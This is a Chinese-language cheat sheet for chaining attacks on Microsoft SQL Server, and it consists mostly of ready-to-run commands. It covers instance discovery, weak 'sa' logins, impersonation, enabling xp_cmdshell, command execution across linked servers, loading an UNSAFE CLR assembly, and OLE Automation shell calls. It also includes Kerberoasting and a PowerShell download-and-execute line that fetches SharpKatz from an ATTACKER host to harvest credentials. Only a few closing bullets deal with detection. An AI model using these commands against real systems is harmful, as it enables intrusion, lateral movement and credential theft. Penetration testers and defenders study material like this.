# MSSQL 链式攻击速查

## §0 发现MSSQL实例

```
# SPN扫描（域内，无需扫端口）
Get-DomainUser -SPN | ? {$_.serviceprincipalname -match 'MSSQL'}
setspn -T domain.com -Q *MSSQL*

# impacket
GetUserSPNs.py domain.com/user:pass -dc-ip DC_IP | grep -i mssql

# PowerUpSQL（专用工具）
Get-SQLInstanceDomain
Get-SQLInstanceBroadcast
Get-SQLInstanceScanUDP -ComputerName 192.168.1.0/24

# UDP 1434 浏览器服务
Import-Module PowerUpSQL; Get-SQLInstanceScanUDP -ComputerName TARGET
```

## §1 认证方式

**Windows集成认证（当前域用户直连）**
```
Get-SQLConnectionTest -Instance "TARGET\SQLEXPRESS" -Verbose
# 或 sqlcmd
sqlcmd -S TARGET\SQLEXPRESS -E
```

**SA弱口令**
```
Get-SQLConnectionTest -Instance TARGET -Username sa -Password sa
Get-SQLConnectionTest -Instance TARGET -Username sa -Password P@ssw0rd
```

**用户模拟（IMPERSONATE权限）**
```sql
-- 查谁能被模拟
SELECT * FROM sys.server_permissions WHERE permission_name = 'IMPERSONATE';
-- 模拟sa
EXECUTE AS LOGIN = 'sa';
SELECT SYSTEM_USER; -- 验证
```

## §2 xp_cmdshell执行

```sql
-- 开启（需sysadmin）
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;

-- 执行命令
EXEC xp_cmdshell 'whoami';
EXEC xp_cmdshell 'ipconfig /all';

-- 用完关闭（opsec）
EXEC sp_configure 'xp_cmdshell', 0; RECONFIGURE;
```

## §3 Linked Server链式跳转

**枚举Linked Server**
```sql
EXEC sp_linkedservers;
SELECT * FROM sys.servers WHERE is_linked = 1;
```

**单跳执行**
```sql
EXEC ('xp_cmdshell ''whoami''') AT [LINKED-SERVER];
SELECT * FROM OPENQUERY([LINKED-SERVER], 'SELECT @@servername');
```

**多跳嵌套（A→B→C）**
```sql
EXEC ('EXEC (''xp_cmdshell ''''whoami'''''') AT [SERVER-C]') AT [SERVER-B];
```

**PowerUpSQL自动化**
```
Get-SQLServerLinkCrawl -Instance TARGET -Verbose
```

## §4 CLR程序集加载

```sql
-- 开启CLR
EXEC sp_configure 'clr enabled', 1; RECONFIGURE;
ALTER DATABASE master SET TRUSTWORTHY ON;

-- 从十六进制加载（无需文件落地）
CREATE ASSEMBLY MyAssembly FROM 0x4D5A...HEX... WITH PERMISSION_SET = UNSAFE;
CREATE PROCEDURE [dbo].[CmdExec] @cmd NVARCHAR(4000) AS EXTERNAL NAME [MyAssembly].[StoredProcedures].[CmdExec];

-- 执行
EXEC CmdExec 'whoami';

-- 清理
DROP PROCEDURE CmdExec; DROP ASSEMBLY MyAssembly;
```

## §5 OLE Automation

```sql
EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE;

DECLARE @shell INT;
EXEC sp_OACreate 'wscript.shell', @shell OUTPUT;
EXEC sp_OAMethod @shell, 'run', null, 'cmd /c whoami > C:\temp\out.txt';

-- 读取结果
CREATE TABLE #output (line VARCHAR(8000));
BULK INSERT #output FROM 'C:\temp\out.txt';
SELECT * FROM #output;
DROP TABLE #output;
```

## §6 MSSQL→域提权路径

**路径1：服务账户Kerberoast**
```
# MSSQL服务通常注册SPN，可Kerberoast
GetUserSPNs.py domain.com/user:pass -request -outputfile tgs.txt
hashcat -m 13100 tgs.txt wordlist.txt
```

**路径2：xp_cmdshell + 凭证收割**
```sql
-- 通过xp_cmdshell运行mimikatz/SharpKatz
EXEC xp_cmdshell 'powershell -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString(''http://ATTACKER/SharpKatz.exe'')"';
```

**路径3：读取MSSQL存储的凭证**
```sql
-- 查Linked Server保存的密码
SELECT s.name, l.remote_name FROM sys.servers s JOIN sys.linked_logins l ON s.server_id = l.server_id;
-- 用DAC连接解密：admin:MSSQLSERVER → sqlcmd -A -S TARGET
```

**检测要点**
- xp_cmdshell启用事件（配置变更审计）
- CLR程序集加载（Event ID 12321）
- Linked Server异常查询（跨实例sp_linkedservers调用）
